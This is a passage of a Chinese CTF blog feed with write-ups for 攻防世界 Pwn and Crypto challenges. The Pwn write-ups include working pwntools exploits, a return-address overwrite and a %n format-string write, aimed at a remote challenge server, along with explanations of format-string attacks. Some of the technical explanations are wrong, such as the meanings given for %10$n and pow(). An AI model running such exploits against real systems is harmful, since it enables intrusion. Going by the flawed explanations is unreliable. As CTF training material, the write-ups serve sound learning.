    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界Pwn</title>
    <link href="http://example.com/2023/03/05/pwn/"/>
    <id>http://example.com/2023/03/05/pwn/</id>
    <published>2023-03-04T21:23:01.422Z</published>
    <updated>2023-08-10T06:20:41.015Z</updated>
    
    <content type="html"><![CDATA[<p>Welcom</p><meta name="referrer" content="no-referrer"/><h1 id="一、level0"><a href="#一、level0" class="headerlink" title="一、level0"></a>一、level0</h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><img src="https://img-blog.csdnimg.cn/img_convert/94804d959252e33b5031fb1d2f863cdf.png" alt="img"></p><h3 id="1-1用checksec查看"><a href="#1-1用checksec查看" class="headerlink" title="1.1用checksec查看"></a>1.1用checksec查看</h3><p>下载附件，使用checksec命令查看该程序是32位还是64位，开启了哪些保护。<img src="https://img-blog.csdnimg.cn/img_convert/f08a4f0a7f7d42a23a9dff948886153d.png" alt="img"></p><blockquote><p><strong>NX 代表 不可执行</strong> (non-executable) 。它通常在 CPU 层面上启用，因此启用 NX 的操作系统可以将某些内存区域标记为不可执行。通常，缓冲区溢出漏洞将恶意代码放在堆栈上，然后尝试执行它。但是，让堆栈这些可写区域变得不可执行，可以防止这种攻击。</p></blockquote><h3 id="1-2-ida"><a href="#1-2-ida" class="headerlink" title="1.2 ida"></a>1.2 ida</h3><p>接着我们将文件放到<strong>IDA</strong>64位里，用f5反汇编查看<img src="https://img-blog.csdnimg.cn/img_convert/81738c64d4ff827f301111ce6955c3b6.png" alt="img"></p><p>代码中提示有一个vulnerable_function()函数进入查看<img src="https://img-blog.csdnimg.cn/img_convert/6997c705143c0285f6d7c587636ab82c.png" alt="img"></p><p>显而易见此处存在栈溢出漏洞，buf的长度为128个字节（也就是0x80）但是read()函数允许往buf中输入<strong>0x200</strong>字节数据。</p><blockquote><p>&#x2F;bin&#x2F;sh是一个特殊的字符串，它代表了一个Unix&#x2F;Linux系统中的shell程序，通常是Bash。在pwn题中，攻击者可以通过控制程序的输入，将&#x2F;bin&#x2F;sh的地址作为参数传递给system函数或者execve函数，从而获取一个shell进程并执行命令。因此，&#x2F;bin&#x2F;sh通常被用于pwn题中的ROP（Return-oriented programming）或者其他代码执行漏洞的利用中。</p></blockquote><p>接着，我们shift+F12可以看到有个很可疑的&#x2F;bin&#x2F;sh，我们双击进去看看</p><p><img src="https://img-blog.csdnimg.cn/img_convert/81b14e74550c3baab9b5d056f7b658d7.png" alt="img"></p><p>接着我们点击那一行后面的<strong>callsystem</strong>进入它的函数体</p><p><img src="https://img-blog.csdnimg.cn/img_convert/cac97a368deb9ed60f0946301f9527a3.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/83f0a4d3a6264cb164ca2c775d3873b7.png" alt="img"></p><p>该函数调用了system(“&#x2F;bin&#x2F;sh”)我们可以利用此函数来get shell</p><h3 id="1-3整体思路："><a href="#1-3整体思路：" class="headerlink" title="1.3整体思路："></a><strong>1.3整体思路：</strong></h3><p><strong>是向buf处输入0x80字节的数据填满buf，此时在继续输入0x80字节的数据造成溢出覆盖ebp处的数据。</strong></p><p><strong>再继续输入数据把返回地址处的数据覆盖为callsystem()的地址，这样vulnerable_function()函数原本要返回到main()函数但是却返回到了callsystem()函数来执行callsystem()</strong></p><h3 id="1-4接下来开始写exp："><a href="#1-4接下来开始写exp：" class="headerlink" title="1.4接下来开始写exp："></a>1.4接下来开始写exp：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote (<span class="string">&#x27;61.147.171.105&#x27;</span>, <span class="number">54500</span>)<span class="comment">#连接远程</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./23&#x27;</span>)<span class="comment">#打开本地程序</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">0x8</span>) + p64(elf.symbols[<span class="string">&#x27;callsystem&#x27;</span>])<span class="comment">#构造payload 需要覆盖0x80个地址+上个ebp地址\# 输入payload来进行操作以拿到程序的shell payload一般等于 偏移量 + 地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)<span class="comment">#接收远程的返回</span></span><br><span class="line">p.send(payload)<span class="comment">#发送payload</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行脚本得到flag!</p><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230228131023932.png" alt="image-20230228131023932"></p><p><strong>以下是我对上面exp的一些函数的总结，这也是我正在学习的象征，虽然只能做一些简单的题，不过我会加油的。</strong></p><p><strong>在编写pwn题的exp代码时，通常需要调试和测试代码，因此需要输出详细的日志信息。因此，<code>context.log_level=&quot;debug&quot;</code>可以帮助开发者更好地了解代码的执行过程和结果，从而更快地发现和解决问题。</strong></p><blockquote><p>**p.recvuntil(string)**是pwntools库中的一个函数，用于接收程序输出中的数据，直到包含指定字符串<code>string</code>的数据出现为止。具体来说，它会等待程序输出数据，并将数据缓存到一个数据缓冲区中，直到缓冲区中包含了指定的字符串<code>string</code>为止，然后返回缓冲区中的数据。如果程序输出中没有包含指定的字符串<code>string</code>，则<code>p.recvuntil(string)</code>会一直等待，直到超时或者接收到数据为止。如果超时，则会抛出一个异常。</p><p>在编写pwn题的exp代码时，通常需要从程序输出中获取一些敏感信息，例如栈指针、libc的基址等等。因此，可以使用<code>p.recvuntil(string)</code>函数接收程序输出中的数据，并从中提取需要的信息。通常情况下，需要多次使用<code>p.recvuntil(string)</code>函数接收程序输出中的数据，以便于获取完整的信息和数据。</p></blockquote><p><strong>需要注意的是，在使用<code>p.recvuntil(string)</code>函数时，需要确保指定的字符串<code>string</code>是唯一的，否则可能会导致接收到错误的数据或者超时。为了避免这种情况，可以使用一些特殊的字符串或者标记来区分不同的输出数据。另外，在实际使用中，需要根据程序的具体输出格式和漏洞类型，选择合适的接收函数和接收方式，以便于获取正确的数据并编写有效的exploit代码</strong>。</p><blockquote><p>**p.sendline(payload)**是pwntools库中的一个函数，用于向程序发送数据并添加一个换行符。具体来说，它会将指定的数据<code>payload</code>发送给程序，并在数据的末尾添加一个换行符<code>\n</code>，以便于模拟用户在终端中输入数据的行为。发送数据后，函数会等待程序的响应并将响应数据缓存到一个数据缓冲区中，然后返回缓冲区中的数据。如果程序没有响应或者响应超时，则会抛出一个异常。</p><p>在编写pwn题的exploit代码时，通常需要向程序发送一些特定的数据，例如缓冲区溢出的payload、格式化字符串的参数等等。使用<code>p.sendline(payload)</code>函数可以将这些数据发送给程序，并使用<code>\n</code>换行符模拟用户输入的行为。这样可以使payload或者输入数据更加真实和有效，从而更容易绕过一些安全保护和检测机制，例如ASLR和DEP等。</p></blockquote><p><strong>需要注意的是，在使用<code>p.sendline(payload)</code>函数时，需要确保发送的数据和换行符的格式是正确的，否则可能会导致程序崩溃或者无法正常运行。为了避免这种情况，可以使用一些特殊的字符或者标记来区分不同的数据，或者使用一些工具或者脚本来自动生成payload或者输入数据。另外，在实际使用中，需要根据程序的具体输入格式和漏洞类型，选择合适的发送函数和发送方式，以便于构造有效的exploit代码。</strong></p><h1 id="二、攻防世界-CGfsb"><a href="#二、攻防世界-CGfsb" class="headerlink" title="二、攻防世界-CGfsb"></a>二、攻防世界-CGfsb</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/82782dcc5dbbb6e04dfb0c6b48551031.png" alt="img"></p><h3 id="1-将文件拖入ubuntu用checksec检查保护"><a href="#1-将文件拖入ubuntu用checksec检查保护" class="headerlink" title="1.将文件拖入ubuntu用checksec检查保护"></a>1.将文件拖入ubuntu用checksec检查保护</h3><blockquote><ol><li><strong>arch：arch是“Architecture”的缩写，表示二进制文件编译时采用的CPU架构。在安全中，arch通常用于表示二进制的CPU架构是否是适合攻击者开发shellcode的目标，因为攻击者需要知道适合攻击平台的内存偏移量和指令。因此，对于一个给定的攻击目标，知道其CPU架构可以帮助攻击者更容易地开发成功的攻击。</strong></li><li><strong>prlro：prlro是“Partial Relro”的缩写，表示二进制是否启用了Partial Relocation Read-Only保护。这种保护机制可以阻止攻击者利用GOT表重定向攻击，因为GOT表的地址被设置为只读，攻击者无法修改它。启用PRLRO可以提高二进制的安全性。</strong></li><li><strong>sstack：sstack是“Stack Smashing Protection”的缩写，表示二进制是否启用了栈破坏保护。栈破坏是指攻击者利用缓冲区溢出漏洞来篡改函数返回地址，从而控制程序的执行流程。启用Sstack可以在执行返回前检查栈帧中的数据完整性，以避免栈破坏攻击。</strong></li><li><strong>nx：nx是“No Execute”的缩写，表示二进制是否启用了不可执行内存保护。不可执行内存的保护可以防止攻击者将指令载入到内存中，从而造成代码执行和攻击。启用NX可以防止许多基于内存的攻击，例如ROP攻击、缓冲区溢出等。</strong></li></ol></blockquote><p>如下图，我们发现PIE没有保护，全局变量的地址固定</p><p><img src="https://img-blog.csdnimg.cn/img_convert/58910593676779651934021c00647310.png" alt="img"></p><blockquote><p><strong>PIE”指的是“位置无关可执行文件”（Position-Independent Executable），它是一种可执行文件格式，可以在加载时动态地或静态地进行地址空间随机化。这使得攻击者更难利用缓冲区溢出等漏洞。因此，启用 PIE 可以提高程序的安全性。如果程序没有启用 PIE 保护，它的地址空间将始终是相同的，这意味着攻击者可以更容易地利用缓冲区溢出漏洞。</strong></p><p><strong>“全局变量地址固定”意味着全局变量在内存中的地址是固定的，不会在程序的不同运行中发生变化。这使得攻击者更容易利用全局变量的漏洞，例如缓冲区溢出。因此，在可能的情况下，应该尽量避免使用全局变量，或者使用一些技术来保护它们，例如限制它们的访问范围和使用堆栈内存而不是静态内存等。</strong></p></blockquote><h3 id="2-使用IDA"><a href="#2-使用IDA" class="headerlink" title="2.使用IDA"></a>2.使用IDA</h3><p>如下图<img src="https://img-blog.csdnimg.cn/img_convert/270dd1b463cd24c47f84a7758cf694b6.png" alt="img"></p><h3 id="3-代码解释"><a href="#3-代码解释" class="headerlink" title="3.代码解释"></a>3.代码解释</h3><blockquote><p><strong>提供的代码是一个 C 语言程序，它会提示用户输入姓名和一条消息，并且会打印一个个性化的问候语和用户输入的消息。</strong></p><p><strong>main<code>函数初始化了一些变量，包括一个大小为 2 的数组</code>buf<code>和一个大小为 100 的字符数组</code>s<code>。该函数使用 </code>setbuf&#96; 函数来禁用标准输入、输出和错误流的缓冲。</strong></p><p><strong>程序随后提示用户输入姓名，使用 <code>puts</code> 函数进行输出，并使用 <code>read</code> 函数将用户输入读取到 <code>buf</code> 数组中。然后程序再次提示用户输入消息，这次使用 <code>puts</code> 函数进行输出。用户输入的消息使用 <code>fgets</code> 函数读取到 <code>s</code> 数组中。</strong></p><p><strong>程序接下来使用 <code>printf</code> 函数，传递 <code>buf</code> 数组作为参数，打印个性化的问候语。用户输入的消息也使用 <code>printf</code> 函数进行输出。</strong></p><p><strong>最后，程序检查 <code>pwnme</code> 的值是否等于 8。如果是，则使用 <code>system</code> 函数执行命令 “cat flag” 并打印包含标志的消息。否则，程序打印一条感谢用户的消息。</strong></p></blockquote><p>但是，对于pwnme根本没有被赋值，所以应该是赋给pwnme一个8的值，但是实在是没有发现什么关于栈溢出的地方，只好寻求大佬帮忙，然后发现说是<strong>格式化字符串漏洞</strong></p><p>作为菜鸡的我不了解（；´д｀）ゞ，我就上网查资料。如下：</p><blockquote><p><strong>格式化字符串漏洞是一种常见的安全漏洞，可以利用程序中使用格式化字符串函数时的不当使用而进行攻击。格式化字符串函数（例如 printf 和 sprintf）将一个格式化字符串作为输入，并使用该字符串格式化并打印数据。攻击者可以构造一个恶意格式化字符串来读取或修改程序内存中的数据。这种攻击通常利用了格式化字符串中的格式控制符（例如 %s 和 %x）来读取或修改内存内容。为了防止这种漏洞，开发人员应该注意在使用格式化字符串函数时正确处理输入，并避免将用户输入作为格式化字符串的一部部分</strong></p><p><strong>对应代码的部分就是printf（&amp;s）;根据我们所学知识printf(“%s”,str);应该是这样所以我们可以通过构造合适的字符串，利用格式化字符串漏洞，实现读取、写入任意内存地址的数据等攻击</strong>。</p></blockquote><table><thead><tr><th>控制符</th><th align="center">描述</th></tr></thead><tbody><tr><td><strong><code>%c</code></strong></td><td align="center"><strong>输出一个字符</strong></td></tr><tr><td><strong><code>%d</code> &#x2F; <code>%i</code></strong></td><td align="center"><strong>输出一个十进制整数</strong></td></tr><tr><td><strong><code>%e</code> &#x2F; <code>%E</code></strong></td><td align="center"><strong>用科学计数法输出一个浮点数</strong></td></tr><tr><td><strong><code>%f</code> &#x2F; <code>%F</code></strong></td><td align="center"><strong>输出一个浮点数</strong></td></tr><tr><td><strong><code>%g</code> &#x2F; <code>%G</code></strong></td><td align="center"><strong>根据值的大小选择使用 <code>%f</code> 或 <code>%e</code></strong></td></tr><tr><td><strong><code>%o</code></strong></td><td align="center"><strong>输出一个八进制整数</strong></td></tr><tr><td><strong><code>%p</code> &#x2F; <code>%x</code> &#x2F; <code>%X</code></strong></td><td align="center"><strong>输出一个指针地址、十六进制整数</strong></td></tr><tr><td><strong><code>%s</code></strong></td><td align="center"><strong>输出一个字符串</strong></td></tr><tr><td><strong><code>%u</code></strong></td><td align="center"><strong>输出一个无符号十进制整数</strong></td></tr><tr><td><strong>%n</strong></td><td align="center"><strong>将已经输出的字符数保存到它所在的参数指针中</strong></td></tr></tbody></table><h3 id="4-找出偏移量"><a href="#4-找出偏移量" class="headerlink" title="4.找出偏移量"></a>4.找出偏移量</h3><p>我们就用%p来进行（加上\是为了好判断位置）</p><p><img src="https://img-blog.csdnimg.cn/img_convert/002c8d29489a193f136e540ff4330f89.png" alt="img"></p><p>如图所示，很明显了0x61616161就是aaaa，所以偏移量就是10</p><p>接下来我们就寻找pwnme的地址就可以了,根据下图我们找到了pwnme的地址为 0x0804A068</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9a12ca74c2c8ba02416512e90fef6204.png" alt="img"></p><h3 id="5-编写exp"><a href="#5-编写exp" class="headerlink" title="5.编写exp"></a>5.编写exp</h3><p>完成上述之后我们就可以编写exp了，不过写了好久就是运行不出来，找资料了解到需要**%10$n**</p><blockquote><p><strong><code>%10$n</code> 是 C 语言中 printf 函数的一种格式化字符串控制符，用于将累计的输出字符数存储在指定的地址中。</strong></p><p><strong>具体来说，<code>%10$n</code> 的含义如下：</strong></p><ul><li><strong><code>%</code>：格式控制符的起始标识；</strong></li><li><strong><code>10</code>：指定要存储输出字符数的地址所占的空间大小，这里是 10 个字节；</strong></li><li><strong><code>$</code>：指定当前格式控制符要操作的参数的位置，这里是第几个参数；</strong></li><li><strong><code>n</code>：表示存储输出字符数的值到指定的地址中。</strong></li></ul><p><strong>由此可知，<code>%10$n</code> 可以通过格式化字符串漏洞来将输出字符的数量存储在指定的地址中。具体来说，攻击者在输入中添加格式化字符串 <code>%10$n</code>，程序在处理该字符串时，会将输出字符的数量写入位于 10 号参数指定的地址中。由于格式化字符串漏洞的特性，攻击者可以构造任意的地址，因此能够获取程序的代码执行过程中的一些敏感信息。</strong></p></blockquote><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;61.147.171.105&#x27;</span>, <span class="number">56813</span>)            </span><br><span class="line">payload = p32(<span class="number">0x0804A068</span>) + <span class="string">&#x27;ssss&#x27;</span> + <span class="string">&#x27;%10$n&#x27;</span>     </span><br><span class="line">p.recvuntil(<span class="string">&quot;please tell me your name:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;taozi&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;leave your message please:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>如图：</p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://img-blog.csdnimg.cn/img_convert/c9c90083e39b86dd189ed1bd3df55220.png" alt="img"></h3><h3 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h3><p>做这道题的时候，对于<strong>格式化字符串</strong>的知识要有一定了解，不然的话，就要像我一样，忙来忙去，很麻烦的</p><p>如何利用格式化字符串呢？我做了一些知识总结。</p><p>格式化字符串攻击（Format String Vulnerabilities，简称FSV）是指攻击者通过构造恶意格式化字符串控制符，在程序中读写不该被访问的内存区域、获取敏感信息等操作。攻击者通常利用以下方式来实施格式化字符串攻击：</p><p>（1）打印栈上的数据</p><p>攻击者可以通过下面的格式化字符串来读取栈上的数据：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Copyprintf</span>(<span class="string">&quot;%s&quot;</span>, format_string);</span><br></pre></td></tr></table></figure><p>这个格式化字符串会将栈上的数据输出到终端上，攻击者可通过逐步构造格式化字符串，读取栈上的敏感信息，甚至是卡号等机密信息。</p><p>（2）任意地址写操作</p><p>攻击者可以利用 <code>%n</code>(表示输出到目前为止已输出的字符数到指定内存中)格式化字符串控制符来实现任意地址写操作。攻击者需要指定目标地址位置（任意写操作）的参数编号，以及欲写入的值。例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copyint x = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test %x%n\n&quot;</span>, &amp;x, x);</span><br></pre></td></tr></table></figure><p>上例将变量 <code>x</code> 的地址作为参数，使其输出十六进制格式的地址，同时通过 <code>%n</code> 将已输出的字符数量写入到变量 <code>x</code> 中。由于攻击者可以构造目标地址参数，因此可以将任意值写入任意地址。</p><p>（3）格式化字符串覆盖计数器</p><p>格式化字符串的解析过程中需要一个计数器来记录当前处理的格式化字符串的位置，攻击者可以用格式化字符串覆盖计数器来对程序进行影响，例如覆盖 <code>printf()</code> 函数内的计数器 <code>number</code>，使其一直循环打印字符串：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copyint number = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test %d%n\n%s%6$d\n&quot;</span>, <span class="number">1</span>, &amp;number, <span class="string">&quot;hello&quot;</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br></pre></td></tr></table></figure><p>上例中，攻击者将变量 <code>number</code> 的地址作为参数，使其输出输出的数字 1，通过 <code>%n</code> 将输出字符数量写入变量 <code>number</code> 中。然后通过 <code>%s</code> 输出字符串 “hello”，同时用 <code>%6$d</code> 输出第 6 个参数的值（即数字 3），由于 <code>%6$d</code> 中的 $6 表示输出的是第 6 个参数，但是在前面已经输出了 1 个参数，因此将计数器覆盖为 1，从而打印死循环。</p><p>由于格式化字符串攻击可对程序构成严重威胁，因此应采取以下预防措施：</p><ol><li>不要相信用户提供的格式化字符串；</li><li>使用安全的输入输出函数，并严格限制输出字符串的长度；</li><li>不要让用户控制格式化字符串的转换说明符；</li><li>在开启编译选项 -Wall 的情况下编译程序，编译器会识别并警告存在的格式化字符串漏洞。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcom&lt;/p&gt;
&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h1 id=&quot;一、level0&quot;&gt;&lt;a href=&quot;#一、level0&quot; class=&quot;headerlink&quot; title=&quot;一、level0&quot;&gt;&lt;/a&gt;一</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="Pwn" scheme="http://example.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界Crypto</title>
    <link href="http://example.com/2023/03/05/Crypto/"/>
    <id>http://example.com/2023/03/05/Crypto/</id>
    <published>2023-03-04T21:22:43.435Z</published>
    <updated>2024-04-11T13:44:57.045Z</updated>
    
    <content type="html"><![CDATA[<p>Welcom</p><meta name="referrer" content="no-referrer"/><h1 id="一、攻防世界Crypto-初识rsa"><a href="#一、攻防世界Crypto-初识rsa" class="headerlink" title="一、攻防世界Crypto - 初识rsa"></a><strong>一、攻防世界Crypto - 初识rsa</strong></h1><h2 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件<img src="https://img-blog.csdnimg.cn/img_convert/4398c3e509a2988046a8dbdf26053428.png" alt="img"></h2><p>这是一道简单的rsa类型的题，我们下载附件后可以看到代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,inverse,getPrime</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)<span class="comment">#bytes_to_long 是 Python 中的一个函数，用于将字节数组转换为整数</span></span><br><span class="line"><span class="comment">#在 RSA 加密和解密中，我们需要将明文和密文表示为一个整数。因此，在进行 RSA 加密和解密时，我们需要使用 bytes_to_long 将明文和密文转换为整数，使用 long_to_bytes 将整数转换为字节数组。</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)<span class="comment">#`pow` 是 Python 中的一个内置函数，用于计算一个数的幂。具体地，`pow(x, y, z)` 返回的结果为 `x*y % z`。其中，`x` 和 `y` 是整数，`z` 是可选的模数。</span></span><br><span class="line"></span><br><span class="line">pq = p*(q-<span class="number">1</span>)</span><br><span class="line">qp = q*(p-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pq=&quot;</span>,pq)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;qp=&quot;</span>,qp)</span><br><span class="line"><span class="meta">... </span>...//代码给出了c、n、pq、qp的值 在此省略了</span><br></pre></td></tr></table></figure><ul><li>关于rsa</li></ul><blockquote><p>在RSA加密中，明文m通过公钥进行加密得到密文c，即c&#x3D;m^e mod n。在RSA解密中，密文c通过私钥进行解密得到明文m，即m&#x3D;c^d mod n。其中，n&#x3D;p<em>q，p和q均为大质数，e是与(p-1)</em>(q-1) 互质的数，d是e在模 (p-1)<em>(q-1) 意义下的逆元。*<em>加密m^e mod N &#x3D;c解密 c^d mod N &#x3D; m</em></em></p></blockquote><p>在RSA加密算法中，phi函数（也称欧拉函数）是一个重要的参数。phi函数的值是根据选择的两个质数p和q计算出来的。phi函数的含义是小于n的正整数中与n互质的数的个数，其中<strong>n&#x3D;p*q</strong>。phi函数的计算公式为：<strong>phi(n) &#x3D; (p-1) * (q-1)</strong></p><p>在这里他给出的时pq和qp，并且我们知道了n，而n&#x3D;pq，这里应该是大数相乘有偏差导致的，具体解决方法用pq*qp&#x2F;n</p><h2 id="2-编写后的脚本加密"><a href="#2-编写后的脚本加密" class="headerlink" title="2.编写后的脚本加密"></a>2.编写后的脚本加密</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse,long_to_bytes</span><br><span class="line">c= ‘’</span><br><span class="line">n= ‘’</span><br><span class="line">pq= ‘’</span><br><span class="line">qp= ‘’</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = pq*qp//n</span><br><span class="line"><span class="built_in">print</span>(phi)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="3运行脚本得到flag"><a href="#3运行脚本得到flag" class="headerlink" title="3运行脚本得到flag"></a>3运行脚本得到flag</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/55fd9903f379f9148eb7cc5d63413fb9.png" alt="img"></p><p>运行就可以得到flag了。</p><h1 id="二、攻防世界baigeiRSA"><a href="#二、攻防世界baigeiRSA" class="headerlink" title="二、攻防世界baigeiRSA"></a>二、攻防世界baigeiRSA</h1><p><img src="https://img-blog.csdnimg.cn/74b3dd0520354b2a8f2a9494618490c6.png#pic_center" alt="在这里插入图片描述"></p><h3 id="1-首先呢，下载附件-◡"><a href="#1-首先呢，下载附件-◡" class="headerlink" title="1.首先呢，下载附件.^◡^."></a>1.首先呢，下载附件.^◡^.</h3><p>附件给出了以下信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n = 88503001447845031603457048661635807319447136634748350130947825183012205093541</span><br><span class="line">c = 40876621398366534035989065383910105526025410999058860023908252093679681817257</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">size = <span class="number">128</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = number.getPrime(size)</span><br><span class="line">q = number.getPrime(size)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n = %d&#x27;</span> % n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = %d&#x27;</span> % c)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-分析代码-人-•͈ᴗ•͈-♡♡"><a href="#2-分析代码-人-•͈ᴗ•͈-♡♡" class="headerlink" title="2.分析代码(人 •͈ᴗ•͈) ♡♡"></a>2.分析代码(人 •͈ᴗ•͈) ♡♡</h3><p>通过给出的数据我们进行分析，我们首先分析这串代码</p><p>（1）import libnum:这里导入了libnum库，通过查询资料我们可以了解到关于libnum一些常用的知识：</p><blockquote><ul><li><strong><code>libnum.n2s(n)</code>: 将整数 <code>n</code> 转换为字符串。</strong></li><li><strong><code>libnum.s2n(s)</code>: 将字符串 <code>s</code> 转换为整数。</strong></li><li><strong><code>libnum.xor(s1, s2)</code>: 计算两个字符串 <code>s1</code> 和 <code>s2</code> 的异或结果。</strong></li><li><strong><code>libnum.invmod(a, m)</code>: 计算模数为 <code>m</code> 的整数 <code>a</code> 的乘法逆元。</strong></li><li><strong><code>libnum.factorize(n)</code>: 因数分解整数 <code>n</code>。</strong></li><li><strong><code>libnum.next_prime(n)</code>: 找到大于整数 <code>n</code> 的下一个素数。</strong></li></ul></blockquote><p>**（2）from Crypto.Util import number:**这从Crypto.Util包中导入了number模块，他提供了在加密中使用的各种数论函数。对应的也就是代码中的 **number.getPrime()<strong>和</strong>pow()**，但是pow()是python内置函数，所以不必使用完整的模块（Crypto.Util.number.pow()），只需使用number模块即可.Ծ‸Ծ </p><p><strong>(3)from secret import flag</strong>：这从名为 <code>secret.py</code> 的另一个文件中导入了 <code>flag</code> 变量。除非我们能够访问该文件，否则我们不知道 <code>flag</code> 的内容。</p><p>**(4)size&#x3D;128:<strong>意味着我们将使用</strong>Crypto.Util.number.getPrime()**函数生成两个大小为128位的随机素数p和q</p><p>**(5)e &#x3D; 65537:**这是一个常用的公共指数值，因为它是一个比较小 的素数，与大多数整数互质，而且计算速度较快。</p><p><strong>(6)n &#x3D; p*q</strong>：这计算 RSA 模数为 p 和 q的乘积。</p><p><strong>(7)m &#x3D; libnum.s2n(flag)</strong><code>：这使用 </code>libnum<code>库中的</code>s2n()函数将 &#96;flag 变量的内容（我们不知道其内容）从字符串转换为整数。</p><p>**(8)c &#x3D; pow(m, 